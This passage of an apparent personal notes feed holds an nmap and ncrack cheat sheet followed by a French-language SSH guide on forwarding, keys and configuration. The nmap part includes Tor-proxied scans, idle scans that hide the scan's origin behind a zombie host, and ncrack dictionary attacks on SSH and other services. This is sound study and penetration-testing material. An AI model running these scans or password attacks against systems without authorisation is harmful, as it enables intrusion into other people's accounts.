&lt;h2 id=&quot;timing-template&quot;&gt;timing template&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# aggressive timing&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.4.20
&lt;span class=&quot;c&quot;&gt;# -T0: paranoid (5 min)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -T1: sneaky&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -T2: polite&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -T3: default&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -T4: aggressive&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -T5: insane&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;scan-report&quot;&gt;scan report&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-oX&lt;/span&gt; scanme.xml scanme.nmap.org
&lt;span class=&quot;c&quot;&gt;# -oX: XML&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -oN: nmap output&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -oG: greppable text&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# -oA: for all&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;nse-scripts&quot;&gt;NSE scripts&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;nmap can be used with &lt;code class=&quot;highlighter-rouge&quot;&gt;Nmap Scripting Engine (NSE)&lt;/code&gt;, it provides an interface for users to script additional tasks.&lt;/p&gt;

&lt;p&gt;Are divided in categoies:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;auth&lt;/code&gt;: scripts related to user authentication&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;broadcast&lt;/code&gt;: scripts that use broadcast petitions to gather information&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;brute&lt;/code&gt;: scripts that help conduct brute-force password auditing&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;default&lt;/code&gt;: scripts that are executed when a script scan is executed (-sC)&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;discovery&lt;/code&gt;: scripts related to host/service discovery.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;dos&lt;/code&gt;: scripts related to denial of service attacks&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit&lt;/code&gt;: scripts that exploit security vulnerabilities&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;external&lt;/code&gt;: scripts that depend on a third-party service&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;fuzzer&lt;/code&gt;: scripts that are focused on fuzzing&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;intrusive&lt;/code&gt;: scripts that might crash something or generate a lot of network noise&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;malware&lt;/code&gt;: scripts related to malware detection&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;safe&lt;/code&gt;: scripts that are considered safe in all situations&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;version&lt;/code&gt;: scripts that are used for advanced versioning&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;vuln&lt;/code&gt;: scripts related to security vulnerabilities&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# execute all scripts&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sC&lt;/span&gt; scname.nmap.org

&lt;span class=&quot;c&quot;&gt;# script arguments&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-title &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; http.useragent&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Mozilla 999&quot;&lt;/span&gt; scname.nmap.org

&lt;span class=&quot;c&quot;&gt;# script selection&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; dns-brute scname.nmap.org
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; http-headers,http-title scanme.nmap.org

&lt;span class=&quot;c&quot;&gt;# run all scripts in the vuln category&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; vuln scname.nmap.org

&lt;span class=&quot;c&quot;&gt;# run all http scripts except 2 of them&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;(http-*) and not (http-slowloris or http-brute)&quot;&lt;/span&gt; scname.nmap.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Interesting scripts: &lt;a href=&quot;https://secwiki.org/w/Nmap/External_Script_Library&quot;&gt;secwiki.org/w/Nmap/External_Script_Library&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;broadcast-ping-scans&quot;&gt;broadcast ping scans&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; broadcast-ping scname.nmap.org
&lt;span class=&quot;c&quot;&gt;# send ICMP echo request&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# receive ICMP echo reply -&amp;gt; open&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# else -&amp;gt; close&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;scan-ipv6-adresses&quot;&gt;Scan IPv6 adresses&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt; scanme.nmap.org

&lt;span class=&quot;c&quot;&gt;# Multicast Listener Discovery (MLD) request to LAN&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; targets-ipv6-multicast-mld &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en0

&lt;span class=&quot;c&quot;&gt;# ICMPv6 RA with SLAAC&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; targets-ipv6-multicast-slaac &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;en0 &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ICMPv6 echo request to all nodes link-local multicast address (ff02::1)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; targets-ipv6-multicast-echo &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'newtargets,interface=eth0'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sL&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ICMPv6 requets with invalid extension header to (ff02::1)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-6&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;targets-ipv6-multicast-invalid-dst.nse &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'newtargets,interface=eth0'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;gathering-network-information-with-broadcast-scripts&quot;&gt;Gathering network information with broadcast scripts&lt;/h4&gt;

&lt;p&gt;NSE broadcast scripts perform tasks to detect Dropbox listeners, sniffing hosts, and discovering DHCP, MS SQL or NCP server.&lt;/p&gt;

&lt;p&gt;There are 44 differents scripts : &lt;a href=&quot;https://nmap.org/nsedoc/categories/broadcast.html&quot;&gt;nmap.org/nsedoc/categories/broadcast.html&lt;/a&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# use all script in broadcast categorie&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; broadcast &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; eth0

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;broadcast and not targets-*&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;scanning-through-proxies&quot;&gt;scanning through proxies&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# TOR, mask origin address&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--proxies&lt;/span&gt; socks4://127.0.0.1:9050 scanme.nmap.org

&lt;span class=&quot;c&quot;&gt;### Spoofing the origin IP of a scan&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# find hosts with an incremental IP ID: zombie&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# IP ID : used for fragmentation&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; ipidseq &amp;lt;your ip&amp;gt;/24
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; ipidseq &lt;span class=&quot;nt&quot;&gt;-iR&lt;/span&gt; 1000
&lt;span class=&quot;c&quot;&gt;# -&amp;gt; |_ipidseq: Incremental!&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# launch idle scan&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sI&lt;/span&gt; &amp;lt;zombie host&amp;gt; scname.nmap.org
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;optimizing-scans&quot;&gt;optimizing scans&lt;/h2&gt;
&lt;hr /&gt;

&lt;h4 id=&quot;phases-of-scan&quot;&gt;phases of scan&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;1 - &lt;strong&gt;Target enumeration&lt;/strong&gt;: parses the target list.&lt;/li&gt;
  &lt;li&gt;2 - &lt;strong&gt;Host discovery&lt;/strong&gt;: establishes if the targets are online and in the network with ICMP echo request and some additional probes (-Pn to skip).&lt;/li&gt;
  &lt;li&gt;3 - &lt;strong&gt;Reverse DNS resolution&lt;/strong&gt;: (-n to skip).&lt;/li&gt;
  &lt;li&gt;4 - &lt;strong&gt;Port scanning&lt;/strong&gt;: determines the state of the ports with SYN/TCP Connect (depending on the user privileges)(-sn to skip).&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;skipping-phases&quot;&gt;skipping phases&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 74.207.244.221
&lt;span class=&quot;c&quot;&gt;# scan with aggressive timing template&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# without DNS resolution (-n)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# without ping (-Pn)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;shodan&quot;&gt;shodan&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;### Perform IP address geolocation&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### Getting information from WHOIS records&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### Traceroute geolocation information&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;### Querying Shodan to obtain target information&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# use API ley&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# https://developer.shodan.io/.&lt;/span&gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; shodan-api &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; shodan-api.apikey&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;ShodanAPI KEY&amp;gt; scname.nmap.org

&lt;span class=&quot;c&quot;&gt;# https://developer.shodan.io/pricing&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# save in CSV files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; shodan-api &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; shodan-api.apikey&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;ShodanAPI KEY&amp;gt;'&lt;/span&gt;,shodan-api.outfile&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;results.csv scname.nmap.org

&lt;span class=&quot;c&quot;&gt;# single target&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--script&lt;/span&gt; shodan-api &lt;span class=&quot;nt&quot;&gt;--script-args&lt;/span&gt; shodan-api.apikey&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&amp;lt;ShodanAPI KEY&amp;gt;'&lt;/span&gt;,shodan-api.target&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&amp;lt;IP&amp;gt;
&lt;span class=&quot;c&quot;&gt;# -n: DNS resolution disable&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;ncrack&quot;&gt;ncrack&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Discover systems with weak password, high-speed network authentication cracking tool. Supports popular network protocols (FTP, SSH, Telnet, HTTP(S), POP3(S), SMB, RDP, VNC, SIP, Redis, PostgreSQL, and MySQL).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ncrack &amp;lt;service-name&amp;gt;://scname.nmap.org:&amp;lt;port-number&amp;gt;

&lt;span class=&quot;c&quot;&gt;# basic dictionary attack agoinst a SSH server&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ncrack ssh://scname.nmap.org:&amp;lt;port&amp;gt;

&lt;span class=&quot;c&quot;&gt;# give username and password files&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ncrack &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &amp;lt;user-list&amp;gt; &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; &amp;lt;passwords-list&amp;gt; &amp;lt;service-name&amp;gt;://scname.nmap.org:&amp;lt;port-number&amp;gt;

&lt;span class=&quot;c&quot;&gt;# give username&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ncrack &lt;span class=&quot;nt&quot;&gt;--user&lt;/span&gt; &amp;lt;username&amp;gt; &amp;lt;service-name&amp;gt;://scname.nmap.org:&amp;lt;port-number&amp;gt;

&lt;span class=&quot;c&quot;&gt;# give password&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ncrack &lt;span class=&quot;nt&quot;&gt;--pass&lt;/span&gt; &amp;lt;service-name&amp;gt;://scname.nmap.org:&amp;lt;port-number&amp;gt;

&lt;span class=&quot;c&quot;&gt;# pausing&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ncrack &lt;span class=&quot;nt&quot;&gt;--resume&lt;/span&gt; cracking-session &amp;lt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;service-name]&amp;gt;://scname.nmap.org:&amp;lt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;port-number]&amp;gt;

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ncrack &lt;span class=&quot;nt&quot;&gt;--save&lt;/span&gt; cracking-session &amp;lt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;service-name]&amp;gt;://scname.nmap.org:&amp;lt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;port-number]&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;a href=&quot;https://nmap.org/ncrack/man.html&quot;&gt;nmap.org/ncrack/man.html&lt;/a&gt;&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>ssh</title>
   <link href="http://localhost:4000/linux/2018/05/10/ssh/"/>
   <updated>2018-05-10T00:00:00+02:00</updated>
   <id>http://localhost:4000/linux/2018/05/10/ssh</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;forwarding&quot;&gt;forwarding&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# local port forwarding&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; 127.0.0.1:8888:intranet.fr.fr:443 user@server.fr
&lt;span class=&quot;c&quot;&gt;# from local, access to intranet.fr.fr:443 by using 127.0.0.1:8888&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# think to add hosts in /etc/hosts na avoid cert errors&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# remote port forwarding&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; 127.0.0.1:8888:127.0.0.1:4000 adel@adel-allam.fr
&lt;span class=&quot;c&quot;&gt;# from remote, access to 127.0.0.1:4000 on local machine via 127.0.0.1:8888&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;basic&quot;&gt;basic&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# création de la paire de clé&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-keygen &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; rsa &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 4096 &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Jean Alfonse public key&quot;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# /home/alfonse/.ssh/id_rsa     --&amp;gt; privée&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# /home/alfonse/.ssh/id_rsa.pub --&amp;gt; publique&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# on partage notre public key sur un serveur&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-copy-id &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 22 &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; /home/alfonse/.ssh/id_rsa.pub alfonse@10.10.10.10

&lt;span class=&quot;c&quot;&gt;# configuration du serveur ssh&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim /etc/ssh/sshd_confi
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
PermitRootLogin no
PasswordAuthentification no
Banner /chemin/vers/motd &lt;span class=&quot;c&quot;&gt;# optionnel&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# redémarrer le service&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl restart sshd
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;ssh-agent&quot;&gt;ssh-agent&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;C’est un agent qui stocke la private key + passphrase pendant la durée de la session. Cela permet de ne pas re-saisir la passphrase à chaque connexion.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# on lance l'agent&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-agent
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;SSH_AUTH_SOCK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/example/blabla&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;SSH_AUTH_SOCK&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# copie et éxecution de SSH_AUTH_SOCK=... + le export&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ SSH_AUTH_SOCK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/path/example/blabla&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;SSH_AUTH_SOCK&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# on donne la passphrase&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-add

&lt;span class=&quot;c&quot;&gt;# quand on veut arrêter l'agent&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh-add &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;sshconfig&quot;&gt;~/.ssh/config&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;On peut ajouter de la configuration sur les hôtes.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;vim ~/.ssh/config
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
Host super-site.fr 10.10.10.10
  User alfonse

Host mon-site
  HostName mon-super-site.fr
  User admin
  Port 2222

Host &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;
  User alfonse
&lt;span class=&quot;c&quot;&gt;# ...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# commande de base&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 2222 admin@mon-super-site.fr

&lt;span class=&quot;c&quot;&gt;# commande simplifiée&lt;/span&gt;
ssh mon-site
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;sshknow_hosts&quot;&gt;~/.ssh/know_hosts&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Ce fichier contient toutes les empreintes de première connexion. Il peut être parfois nécessaire de supprimer quelques entrées, suite à un changement de serveur par exemple.&lt;/p&gt;

